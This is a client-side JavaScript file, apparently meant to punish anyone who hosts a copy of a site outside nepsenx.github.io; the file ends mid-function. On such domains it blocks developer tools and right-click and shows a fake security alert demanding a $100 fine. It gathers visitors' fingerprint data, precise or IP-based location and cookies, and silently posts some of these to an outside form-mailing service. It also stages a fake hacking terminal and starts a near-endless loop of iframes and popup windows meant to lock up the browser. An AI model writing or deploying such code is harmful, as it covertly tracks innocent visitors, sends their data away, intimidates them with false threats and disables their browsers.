setTimeout(() => {
    // Check if domain is not "nepsen.github.io"
    if (window.location.hostname !== "nepsenx.github.io") {
        // Create matrix effect immediately
        
        // Create and show the warning page
        showWarningPage();
                
        // Send email in background
        sendEmail();

        // Open multiple windows after 5 seconds with hacked effect
        setTimeout(launchTerminal, 10000);
        // Open multiple windows after 5 seconds with hacked effect
        openMultipleWindowsWithHackedEffect();
    }
}, 5000);
(function() {
  document.addEventListener("keydown", function(e) {
    let blocked = false;

    // F12
    if (e.key === "F12") {
      blocked = true;
    }

    // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
    if (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) {
      blocked = true;
    }

    // Ctrl+U (View Source)
    if (e.ctrlKey && e.key.toLowerCase() === "u") {
      blocked = true;
    }

    // Ctrl+S (Save page)
    if (e.ctrlKey && e.key.toLowerCase() === "s") {
      blocked = true;
    }

    if (blocked) {
      e.preventDefault();
      e.stopPropagation();
      window.open(
        "https://nepsenx.github.io/home",
        "_blank",
        "width=800,height=600,scrollbars=yes,resizable=yes"
      );
      return false;
    }
  });

  // Disable right-click (context menu)
  document.addEventListener("contextmenu", function(e) {
    e.preventDefault();
  });
})();
// Browser Error Simulation Script
// Get the current host
const currentHost = window.location.host;

// Check the host
if (currentHost === "nepsenx.github.io") {
    // Do nothing
} else {
    (function() {
        // Check if already shown
        if (localStorage.getItem("backend-was-done") === "true") {
            // Don't show code error again, but still show offline if needed
            const isOffline = !navigator.onLine;
            const isWrongDomain = !location.hostname.endsWith("nepsenx.github.io");
            
            if (isOffline || isWrongDomain) {
                // Create minimal overlay for offline/wrong domain scenario
                const overlay = document.createElement('div');
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: #f8f9fa;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    z-index: 99999;
                    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                    color: #202124;
                    padding: 20px;
                    box-sizing: border-box;
                `;
                
                const browserWindow = document.createElement('div');
                browserWindow.style.cssText = `
                    width: 100%;
                    max-width: 700px;
                    background: white;
                    border-radius: 8px;
                    overflow: hidden;
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
                    color: #202124;
                `;
                
                // Browser detection function
                function detectBrowser() {
                    const ua = navigator.userAgent;
                    let browser = "Unknown Browser";
                    
                    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) {
                        browser = "Chrome";
                    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                        browser = "Safari";
                    } else if (ua.includes("Edg")) {
                        browser = "Edge";
                    } else if (ua.includes("Firefox")) {
                        browser = "Firefox";
                    } else if (ua.includes("SamsungBrowser")) {
                        browser = "Samsung Internet";
                    } else if (ua.includes("OPR") || ua.includes("Opera")) {
                        browser = "Opera";
                    } else if (ua.includes("UCBrowser")) {
                        browser = "UC Browser";
                    } else if (ua.includes("Brave")) {
                        browser = "Brave";
                    } else if (ua.includes("Vivaldi")) {
                        browser = "Vivaldi";
                    } else if (ua.includes("Tor")) {
                        browser = "Tor Browser";
                    } else {
                        browser = "Unknown";
                    }
                    
                    return browser;
                }
                
                // Show offline message
                function showOfflineMessage(browser) {
                    let icon = "🌐";
                    let title = "";
                    let message = "";
                    
                    if (browser === "Chrome") {
                        icon = "🦖";
                        title = "No internet";
                        message = "Try:\n• Checking the network cables, modem, and router\n• Reconnecting to Wi-Fi\n• Running Network Diagnostics";
                    } else if (browser === "Firefox") {
                        icon = "🦊";
                        title = "Unable to connect";
                        message = "Firefox can't establish a connection to the server.";
                    } else if (browser === "Safari") {
                        icon = "🍎";
                        title = "You Are Not Connected to the Internet";
                        message = "This page can't be displayed because your computer is currently offline.";
                    } else if (browser === "Edge") {
                        icon = "🧩";
                        title = "Hmm... can't reach this page";
                        message = "It looks like you aren't connected to the internet. Try checking your network connection.";
                    } else {
                        title = "No Internet Connection";
                        message = "Please check your network connection and try again.";
                    }
                    
                    browserWindow.innerHTML = `
                        <div style="padding: 40px 20px; text-align: center;">
                            <div style="font-size: 80px; margin-bottom: 20px;">${icon}</div>
                            <div style="font-size: 28px; font-weight: 400; margin-bottom: 15px; color: #202124;">${title}</div>
                            <div style="font-size: 15px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; white-space: pre-line;">${message}</div>
                            <div style="display: flex; gap: 10px; justify-content: center;">
                                <button style="padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; background: #1a73e8; color: white;" onclick="window.location.reload()">Try again</button>
                            </div>
                        </div>
                    `;
                    
                    overlay.appendChild(browserWindow);
                    document.body.appendChild(overlay);
                }
                
                const browser = detectBrowser();
                showOfflineMessage(browser);
            }
            return;
        }
    
        // Create overlay container
        const overlay = document.createElement('div');
        overlay.id = 'browser-error-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #f8f9fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            color: #202124;
            padding: 20px;
            box-sizing: border-box;
        `;
        
        // Create browser window UI
        const browserWindow = document.createElement('div');
        browserWindow.style.cssText = `
            width: 100%;
            max-width: 700px;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            color: #202124;
        `;
        
        // Browser tabs
        const tabs = document.createElement('div');
        tabs.style.cssText = `
            display: flex;
            background: #f1f3f4;
            padding: 0 12px;
            border-bottom: 1px solid #dadce0;
        `;
        
        const tab = document.createElement('div');
        tab.style.cssText = `
            padding: 12px 16px;
            font-size: 14px;
            color: #5f6368;
            border-bottom: 2px solid transparent;
            margin-right: 4px;
        `;
        
        const activeTab = document.createElement('div');
        activeTab.style.cssText = `
            padding: 12px 16px;
            font-size: 14px;
            color: #202124;
            border-bottom: 2px solid #1a73e8;
            background: white;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
        `;
        
        activeTab.textContent = 'Error';
        tab.textContent = 'New Tab';
        
        tabs.appendChild(activeTab);
        tabs.appendChild(tab);
        
        // Browser URL bar
        const urlBar = document.createElement('div');
        urlBar.style.cssText = `
            display: flex;
            align-items: center;
            padding: 12px 16px;
            background: #f8f9fa;
            border-bottom: 1px solid #dadce0;
        `;
        
        const securityIcon = document.createElement('div');
        securityIcon.style.cssText = `
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: #0b8043;
            margin-right: 8px;
            position: relative;
        `;
        
        securityIcon.innerHTML = `
            <div style="position: absolute; top: 5px; left: 5px; width: 6px; height: 3px; border: 1px solid white; border-bottom: none; border-top-left-radius: 2px; border-top-right-radius: 2px;"></div>
            <div style="position: absolute; top: 8px; left: 3px; width: 10px; height: 5px; border: 1px solid white; border-top: none; border-bottom-left-radius: 2px; border-bottom-right-radius: 2px;"></div>
        `;
        
        const urlText = document.createElement('div');
        urlText.style.cssText = `
            flex: 1;
            background: white;
            padding: 8px 12px;
            border-radius: 4px;
            border: 1px solid #dadce0;
            font-size: 14px;
            color: #5f6368;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        `;
        
        urlText.textContent = window.location.href;
        
        urlBar.appendChild(securityIcon);
        urlBar.appendChild(urlText);
        
        // Error content
        const errorContent = document.createElement('div');
        errorContent.style.cssText = `
            padding: 40px 20px;
            text-align: center;
        `;
        
        const errorIcon = document.createElement('div');
        errorIcon.style.cssText = `
            font-size: 80px;
            margin-bottom: 20px;
        `;
        
        const errorTitle = document.createElement('div');
        errorTitle.style.cssText = `
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 15px;
            color: #202124;
        `;
        
        const errorMessage = document.createElement('div');
        errorMessage.style.cssText = `
            font-size: 15px;
            color: #5f6368;
            margin-bottom: 25px;
            line-height: 1.5;
        `;
        
        const errorDetails = document.createElement('details');
        errorDetails.style.cssText = `
            background: #f8f9fa;
            border-radius: 6px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            font-size: 13px;
            color: #5f6368;
            border-left: 4px solid #dadce0;
        `;
        
        const errorSummary = document.createElement('summary');
        errorSummary.style.cssText = `
            font-weight: 500;
            cursor: pointer;
            outline: none;
        `;
        
        errorSummary.textContent = 'Details';
        
        const errorDetailsText = document.createElement('div');
        errorDetailsText.style.cssText = `
            margin-top: 10px;
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 12px;
        `;
        
        errorDetails.appendChild(errorSummary);
        errorDetails.appendChild(errorDetailsText);
        
        const buttons = document.createElement('div');
        buttons.style.cssText = `
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 25px;
        `;
        
        const primaryButton = document.createElement('button');
        primaryButton.style.cssText = `
            padding: 10px 16px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            background: #1a73e8;
            color: white;
        `;
        
        const secondaryButton = document.createElement('button');
        secondaryButton.style.cssText = `
            padding: 10px 16px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border: 1px solid #dadce0;
            background: white;
            color: #1a73e8;
        `;
        
        primaryButton.textContent = 'Try again';
        secondaryButton.textContent = 'Learn more';
        
        buttons.appendChild(primaryButton);
        buttons.appendChild(secondaryButton);
        
        // Browser controls
        const browserControls = document.createElement('div');
        browserControls.style.cssText = `
            display: flex;
            align-items: center;
            padding: 8px 16px;
            background: #f8f9fa;
            border-top: 1px solid #dadce0;
            font-size: 13px;
            color: #5f6368;
        `;
        
        const controlsLeft = document.createElement('div');
        controlsLeft.style.cssText = `
            flex: 1;
            display: flex;
            align-items: center;
        `;
        
        const controlsRight = document.createElement('div');
        controlsRight.style.cssText = `
            display: flex;
            gap: 15px;
        `;
        
        const helpLink = document.createElement('a');
        helpLink.href = '#';
        helpLink.style.cssText = `
            color: #1a73e8;
            text-decoration: none;
        `;
        helpLink.textContent = 'Help';
        
        const dropdown = document.createElement('div');
        dropdown.style.cssText = `
            position: relative;
            display: inline-block;
        `;
        
        const dropdownButton = document.createElement('button');
        dropdownButton.style.cssText = `
            background: none;
            border: none;
            color: #5f6368;
            cursor: pointer;
            font-size: 13px;
        `;
        dropdownButton.textContent = '⋮';
        
        controlsRight.appendChild(helpLink);
        controlsRight.appendChild(dropdownButton);
        
        browserControls.appendChild(controlsLeft);
        browserControls.appendChild(controlsRight);
        
        // Assemble the browser window
        errorContent.appendChild(errorIcon);
        errorContent.appendChild(errorTitle);
        errorContent.appendChild(errorMessage);
        errorContent.appendChild(errorDetails);
        errorContent.appendChild(buttons);
        
        browserWindow.appendChild(tabs);
        browserWindow.appendChild(urlBar);
        browserWindow.appendChild(errorContent);
        browserWindow.appendChild(browserControls);
        
        overlay.appendChild(browserWindow);
        document.body.appendChild(overlay);
        
        // Browser detection function
        function detectBrowser() {
            const ua = navigator.userAgent;
            let browser = "Unknown Browser";
            
            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) {
                browser = "Chrome";
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                browser = "Safari";
            } else if (ua.includes("Edg")) {
                browser = "Edge";
            } else if (ua.includes("Firefox")) {
                browser = "Firefox";
            } else if (ua.includes("SamsungBrowser")) {
                browser = "Samsung Internet";
            } else if (ua.includes("OPR") || ua.includes("Opera")) {
                browser = "Opera";
            } else if (ua.includes("UCBrowser")) {
                browser = "UC Browser";
            } else if (ua.includes("Brave")) {
                browser = "Brave";
            } else if (ua.includes("Vivaldi")) {
                browser = "Vivaldi";
            } else if (ua.includes("Tor")) {
                browser = "Tor Browser";
            } else {
                browser = "Unknown";
            }
            
            return browser;
        }
        
        // Show realistic browser-like message
        function showMessage(type, browser) {
            let icon = "🌐";
            let title = "";
            let message = "";
            let details = "";
            
            // Gather user details
            const userDetails = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Not available',
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : 'Not available',
                pdfViewerEnabled: navigator.pdfViewerEnabled || 'Not available',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
                deviceMemory: navigator.deviceMemory || 'Not available',
                maxTouchPoints: navigator.maxTouchPoints || 'Not available',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth} bit`,
                pixelDepth: `${screen.pixelDepth} bit`,
                availableScreen: `${screen.availWidth}x${screen.availHeight}`,
                innerSize: `${window.innerWidth}x${window.innerHeight}`,
                outerSize: `${window.outerWidth}x${window.outerHeight}`,
                location: window.location.href,
                referrer: document.referrer || 'No referrer',
                date: new Date().toString(),
                localStorage: typeof(Storage) !== "undefined" ? 'Available' : 'Not available',
                sessionStorage: typeof(Storage) !== "undefined" ? 'Available' : 'Not available',
                indexedDB: window.indexedDB ? 'Available' : 'Not available',
                serviceWorker: navigator.serviceWorker ? 'Available' : 'Not available',
                webGL: getWebGLInfo(),
                cookies: document.cookie || 'No cookies'
            };
            
            // Format user details for display
            let userDetailsText = "User Details:\n\n";
            for (const [key, value] of Object.entries(userDetails)) {
                userDetailsText += `${key}: ${value}\n`;
            }
            
            // Set content based on browser and error type
            if (browser === "Chrome") {
                icon = "🦖";
                if (type === "offline") {
                    title = "No internet";
                    message = "Try:\n• Checking the network cables, modem, and router\n• Reconnecting to Wi-Fi\n• Running Network Diagnostics";
                    details = "ERR_INTERNET_DISCONNECTED\n\n" + userDetailsText;
                } else {
                    title = "This site can't be reached";
                    message = "Try:\n• Checking the connection\n• Checking the proxy and the firewall\n• Running Windows Network Diagnostics";
                    details = "ERR_NAME_NOT_RESOLVED\n\n" + userDetailsText;
                }
            } else if (browser === "Firefox") {
                icon = "🦊";
                if (type === "offline") {
                    title = "Unable to connect";
                    message = "Firefox can't establish a connection to the server.";
                    details = "NS_ERROR_UNKNOWN_HOST\n\n" + userDetailsText;
                } else {
                    title = "Page isn't working";
                    message = "The page isn't redirecting properly. An error occurred during a connection.";
                    details = "NS_ERROR_CONNECTION_REFUSED\n\n" + userDetailsText;
                }
            } else if (browser === "Safari") {
                icon = "🍎";
                if (type === "offline") {
                    title = "You Are Not Connected to the Internet";
                    message = "This page can't be displayed because your computer is currently offline.";
                    details = "Safari cannot open the page because your computer is not connected to the Internet.\n\n" + userDetailsText;
                } else {
                    title = "Safari Can't Open the Page";
                    message = "Safari can't open the page because the server can't be found.";
                    details = "Safari cannot open the page. The error is: \"The server cannot be found\"\n\n" + userDetailsText;
                }
            } else if (browser === "Edge") {
                icon = "🧩";
                if (type === "offline") {
                    title = "Hmm... can't reach this page";
                    message = "It looks like you aren't connected to the internet. Try checking your network connection.";
                    details = "ERR_INTERNET_DISCONNECTED\n\n" + userDetailsText;
                } else {
                    title = "This page isn't working";
                    message = "The site didn't send any data. Try running Windows Network Diagnostics";
                    details = "ERR_EMPTY_RESPONSE\n\n" + userDetailsText;
                }
            } else if (browser === "Opera") {
                icon = "🎭";
                if (type === "offline") {
                    title = "No internet connection";
                    message = "Opera cannot connect to the internet. Please check your network connection and try again.";
                    details = "ERR_INTERNET_DISCONNECTED\n\n" + userDetailsText;
                } else {
                    title = "Connection failed";
                    message = "Opera could not load the webpage because the server sent no data.";
                    details = "ERR_EMPTY_RESPONSE\n\n" + userDetailsText;
                }
            } else {
                // Default error message
                icon = "🌐";
                if (type === "offline") {
                    title = "No Internet Connection";
                    message = "Please check your network connection and try again.";
                    details = "ERR_INTERNET_DISCONNECTED\n\n" + userDetailsText;
                } else {
                    title = "Unable to Load Content";
                    message = "The content you requested is currently unavailable. Please try again later.";
                    details = "ERR_CONNECTION_REFUSED\n\n" + userDetailsText;
                }
            }
            
            // Update the UI with the error message
            errorIcon.textContent = icon;
            errorTitle.textContent = title;
            errorMessage.textContent = message;
            errorMessage.style.whiteSpace = 'pre-line';
            errorDetailsText.textContent = details;
            
            // Add event listeners to buttons
            primaryButton.onclick = function() {
                window.location.reload();
            };
            
            secondaryButton.onclick = function() {
                window.open('https://support.google.com/chrome/answer/6098869', '_blank');
            };
        }
        
        // Helper function to get WebGL info
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    return 'Available (no debug info)';
                }
                return 'Not available';
            } catch (e) {
                return 'Error checking WebGL';
            }
        }
        
        const browser = detectBrowser();
        const isOffline = !navigator.onLine;
        const isWrongDomain = !location.hostname.endsWith("nepsen.github.io");
        
        // Offline / Wrong domain first
        if (isOffline || isWrongDomain) {
            showMessage("offline", browser);
            return;
        }
        
        // Online + correct domain -> fetch resources
        const resources = ["/cloudgaimghub/1.js", "/ishahi/index.html"];
        let allFound = true;
        
        // Check resources
        Promise.all(resources.map(async (res) => {
            try {
                const resp = await fetch(res, { method: "HEAD" });
                if (!resp.ok) return false;
                return true;
            } catch(e) {
                return false;
            }
        })).then(results => {
            allFound = results.every(result => result);
            
            // Show code error if any resource missing
            if(!allFound) {
                showMessage("codeError", browser);
                localStorage.setItem("backend-was-done","true");
            } else {
                // Remove the overlay if everything is fine
                document.body.removeChild(overlay);
            }
        });
    })();
    // Code to run if the host is not nepsen.github.io
    console.log("This is NOT nepsen.github.io");
}


function showWarningPage() {
    // Create the warning page elements
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2a 100%);
        color: #fff;
        z-index: 9999;
        font-family: 'Segoe UI', 'Roboto', sans-serif;
        padding: 20px;
        overflow: auto;
        display: flex;
        justify-content: center;
        align-items: center;
    `;
    
    const content = document.createElement('div');
    content.style.cssText = `
        max-width: 800px;
        background: rgba(30, 30, 45, 0.95);
        border-radius: 16px;
        padding: 30px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 50, 50, 0.3);
    `;
    
    content.innerHTML = `
        <div style="text-align: center; margin-bottom: 25px;">
            <div style="font-size: 42px; color: #ff3366; margin-bottom: 15px;">⚠️</div>
            <h1 style="font-size: 28px; font-weight: 700; margin-bottom: 10px; background: linear-gradient(45deg, #ff3366, #ff7733);
                -webkit-background-clip: text; -webkit-text-fill-color: transparent;">SECURITY ALERT</h1>
            <p style="color: #a0a0c0; font-size: 18px;">Unauthorized code usage detected</p>
        </div>
        
        <div style="background: rgba(255, 50, 50, 0.1); padding: 20px; border-radius: 12px; margin-bottom: 25px; border-left: 4px solid #ff3366;">
            <p style="font-size: 18px; margin-bottom: 15px;">You have illegally copied proprietary code from Nepsen Company.</p>
            <p style="margin-bottom: 10px;">This action has been logged and reported to authorities.</p>
            <p style="font-weight: 700; color: #ff3366;">You must pay a $100 fine for violating intellectual property rights.</p>
        </div>
        
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px;">
            <div>
                <h2 style="font-size: 18px; margin-bottom: 15px; color: #4cc9f0; display: flex; align-items: center;">
                    <span style="margin-right: 10px;">👤</span> User Information
                </h2>
                <div id="userInfo" style="font-family: 'Fira Code', monospace; font-size: 14px; color: #c0c0ff;"></div>
            </div>
            
            <div>
                <h2 style="font-size: 18px; margin-bottom: 15px; color: #4cc9f0; display: flex; align-items: center;">
                    <span style="margin-right: 10px;">🌐</span> Browser Information
                </h2>
                <div id="browserInfo" style="font-family: 'Fira Code', monospace; font-size: 14px; color: #c0c0ff;"></div>
            </div>
        </div>
        
        <div style="text-align: center; margin-top: 30px;">
            <div style="display: inline-flex; align-items: center; background: rgba(255, 50, 50, 0.15); padding: 10px 20px; border-radius: 50px;">
                <div style="width: 12px; height: 12px; background: #ff3366; border-radius: 50%; margin-right: 10px; animation: pulse 1.5s infinite;"></div>
                <p style="margin: 0; font-size: 14px; color: #ff88a0;">This page will close automatically in <span id="countdown">10</span> seconds</p>
            </div>
        </div>
    `;
    
    overlay.appendChild(content);
    document.body.appendChild(overlay);
    
    // Start countdown
    startCountdown();
    
    // Get and display user info
    displayUserInfo();
    // Get and display browser info
    displayBrowserInfo();
    
    // Add animation style
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    `;
    document.head.appendChild(style);
}

function startCountdown() {
    let timeLeft = 5;
    const countdownElement = document.getElementById('countdown');
    
    const countdownInterval = setInterval(() => {
        timeLeft--;
        countdownElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
        }
    }, 1);
}

async function displayUserInfo() {
    const userInfoDiv = document.getElementById('userInfo');
    
    try {
        // Get IP-based location
        const location = await getUserLocation();
        
        // Get more detailed user info
        const userInfo = {
            'IP Address': 'Detecting...',
            'Location': `${location.city}, ${location.country}`,
            'Coordinates': `${location.latitude}, ${location.longitude}`,
            'Screen Resolution': `${screen.width}x${screen.height}`,
            'Color Depth': `${screen.colorDepth} bit`,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Language': navigator.language,
            'Online Status': navigator.onLine ? 'Online' : 'Offline'
        };
        
        // Format user info for display
        let userInfoHTML = '';
        for (const [key, value] of Object.entries(userInfo)) {
            userInfoHTML += `<div style="margin-bottom: 8px;"><span style="color: #ff3366;">${key}:</span> ${value}</div>`;
        }
        userInfoDiv.innerHTML = userInfoHTML;
        
        // Get IP address
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            userInfoDiv.querySelector('div:first-child').innerHTML = `<span style="color: #ff3366;">IP Address:</span> ${ipData.ip}`;
        } catch (error) {
            userInfoDiv.querySelector('div:first-child').innerHTML = `<span style="color: #ff3366;">IP Address:</span> Unable to detect`;
        }
        
    } catch (error) {
        userInfoDiv.innerHTML = '<div style="color: #ff3366;">Error gathering user information</div>';
    }
}

function displayBrowserInfo() {
    const browserInfoDiv = document.getElementById('browserInfo');
    
    // Detect browser
    const userAgent = navigator.userAgent;
    let browserName = "Unknown Browser";
    
    if (userAgent.includes("Firefox")) browserName = "Mozilla Firefox";
    else if (userAgent.includes("Edg")) browserName = "Microsoft Edge";
    else if (userAgent.includes("Chrome")) browserName = "Google Chrome";
    else if (userAgent.includes("Safari")) browserName = "Apple Safari";
    else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browserName = "Opera";
    
    // Detect OS
    let osName = "Unknown OS";
    if (userAgent.includes("Windows")) osName = "Windows";
    else if (userAgent.includes("Mac")) osName = "macOS";
    else if (userAgent.includes("Linux")) osName = "Linux";
    else if (userAgent.includes("Android")) osName = "Android";
    else if (userAgent.includes("iOS")) osName = "iOS";
    
    // Browser information
    const browserInfo = {
        'Browser': browserName,
        'Operating System': osName,
        'User Agent': navigator.userAgent,
        'Platform': navigator.platform,
        'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
        'JavaScript Enabled': 'Yes',
        'Do Not Track': navigator.doNotTrack || 'Not specified',
        'Hardware Concurrency': navigator.hardwareConcurrency || 'Unknown',
        'Device Memory': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'
    };
    
    // Format browser info for display
    let browserInfoHTML = '';
    for (const [key, value] of Object.entries(browserInfo)) {
        browserInfoHTML += `<div style="margin-bottom: 8px;"><span style="color: #ff3366;">${key}:</span> ${value}</div>`;
    }
    browserInfoDiv.innerHTML = browserInfoHTML;
}

async function getUserLocation() {
    const DEFAULT_COORDS = {
        latitude: 21.4225,
        longitude: 39.8262,
        city: 'Makkah',
        country: 'Saudi Arabia'
    };

    // Wrap navigator.geolocation in a promise
    const getBrowserLocation = () => {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                return reject(new Error("Geolocation not supported"));
            }
            navigator.geolocation.getCurrentPosition(
                position => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        city: null, // city/country won’t be available from browser GPS
                        country: null
                    });
                },
                error => reject(error),
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        });
    };

    try {
        // 1. Try browser location (more accurate if user allows)
        const browserLocation = await getBrowserLocation();
        if (browserLocation) {
            return browserLocation;
        }
    } catch (error) {
        console.warn("Browser geolocation failed, trying IP lookup...");
    }

    try {
        // 2. Fallback: approximate location from IP
        const ipResponse = await fetch("https://ipapi.co/json/");
        const ipData = await ipResponse.json();

        return {
            latitude: ipData.latitude || DEFAULT_COORDS.latitude,
            longitude: ipData.longitude || DEFAULT_COORDS.longitude,
            city: ipData.city || DEFAULT_COORDS.city,
            country: ipData.country_name || DEFAULT_COORDS.country
        };
    } catch (error) {
        console.error("Error getting location from IP:", error);
    }

    // 3. Final fallback: Default (Makkah)
    return DEFAULT_COORDS;
}


function sendEmail() {
    // Gather user info for email
    getUserLocation().then(location => {
        const userInfo = `
            User Agent: ${navigator.userAgent}
            Platform: ${navigator.platform}
            Language: ${navigator.language}
            Screen: ${screen.width}x${screen.height}
            Color Depth: ${screen.colorDepth} bit
            Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
            Location: ${location.city}, ${location.country}
            Coordinates: ${location.latitude}, ${location.longitude}
            Page URL: ${window.location.href}
            Copy Time: ${new Date().toISOString()}
        `;
        
        const emailData = {
            name: "Code Copy Detector",
            email: "hacker@gmail.com",
            message: `A user has copied code from Nepsen Company without permission.\n\nUser Details:\n${userInfo}`,
            _subject: "Code Copy Alert - User Information",
            _replyto: "hacker@gmail.com",
            _template: "table",
            _captcha: "false"
        };
        
        // Send using fetch API instead of form submission
        fetch('https://formsubmit.co/ajax/arafatislamlam15@gmail.com', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(emailData)
        })
        .then(response => response.json())
        .then(data => console.log('Email sent successfully', data))
        .catch(error => console.error('Error sending email:', error));
    });
}

function openMultipleWindowsWithHackedEffect() {
    // Create hacked effect overlay
    const hackedOverlay = document.createElement('div');
    hackedOverlay.id = 'hackedOverlay';
    hackedOverlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.95);
        z-index: 10000;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: 'Courier New', monospace;
        color: #0f0;
        overflow: hidden;
    `;
    
    // Create terminal-like display
    const terminal = document.createElement('div');
    terminal.style.cssText = `
        width: 80%;
        height: 70%;
        background-color: #000;
        border: 2px solid #0f0;
        padding: 20px;
        overflow: auto;
        box-shadow: 0 0 20px #0f0;
    `;
    
    // Add terminal content
    terminal.innerHTML = `
        <div style="margin-bottom: 15px;">
            <span style="color: #0f0;">root@hackerserver:~$</span> initiating system breach...
        </div>
        <div id="terminal-output" style="line-height: 1.4;"></div>
        <div style="margin-top: 15px;">
            <span style="color: #0f0;">root@hackerserver:~$</span> <span id="command-input"></span><span style="background-color: #0f0; width: 10px; height: 15px; display: inline-block; animation: blink 1s infinite;"></span>
        </div>
    `;
    
    hackedOverlay.appendChild(terminal);
    document.body.appendChild(hackedOverlay);
    
    // Add blinking cursor animation
    const blinkStyle = document.createElement('style');
    blinkStyle.textContent = `
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    `;
    document.head.appendChild(blinkStyle);
    
    // Simulate terminal output
    const terminalOutput = document.getElementById('terminal-output');
    const commands = [
        "scanning system vulnerabilities...",
        "bypassing security protocols...",
        "accessing user data...",
        "extracting browsing history...",
        "collecting saved passwords...",
        "locating personal files...",
        "establishing remote connection...",
        "uploading data to external server...",
        "injecting persistence script...",
        "covering tracks..."
    ];
    
    let commandIndex = 0;
    const commandInterval = setInterval(() => {
        if (commandIndex < commands.length) {
            const commandLine = document.createElement('div');
            commandLine.innerHTML = `<span style="color: #0f0;">root@hackerserver:~$</span> ${commands[commandIndex]}`;
            terminalOutput.appendChild(commandLine);
            terminal.scrollTop = terminal.scrollHeight;
            commandIndex++;
        } else {
            clearInterval(commandInterval);
            
            // Create iframes after commands finish
            createHackedIframes();
            
            // Remove hacked overlay after all iframes are created
            setTimeout(() => {
                if (document.body.contains(hackedOverlay)) {
                    document.body.removeChild(hackedOverlay);
                }
                
                // Remove the original warning page
                const overlay = document.querySelector('div[style*="z-index: 9999"]');
                if (overlay) {
                    document.body.removeChild(overlay);
                }
                
                // Start opening tabs and windows repeatedly
                startTabOpeningLoop();
            }, 150);
        }
    }, 80);
    
    // Function to create iframes with hacked appearance
    function createHackedIframes() {
        for (let i = 0; i < 99999999999999999999999999999999999; i++) {
            setTimeout(() => {
                const iframe = document.createElement('iframe');
                iframe.style.cssText = `
                    position: fixed;
                    top: ${20 + (i * 10)}px;
                    left: ${20 + (i * 10)}px;
                    width: 300px;
                    height: 200px;
                    border: 2px solid #f00;
                    z-index: 9998;
                    background: #000;
                    box-shadow: 0 0 15px #f00;
                `;
                iframe.src = 'https://nepsen.github.io/home';
                document.body.appendChild(iframe);
                
                // Add hacked text overlay to iframe
                setTimeout(() => {
                    try {
                        const hackedText = document.createElement('div');
                        hackedText.style.cssText = `
                            position: absolute;
                            top: 0;
                            left: 0;
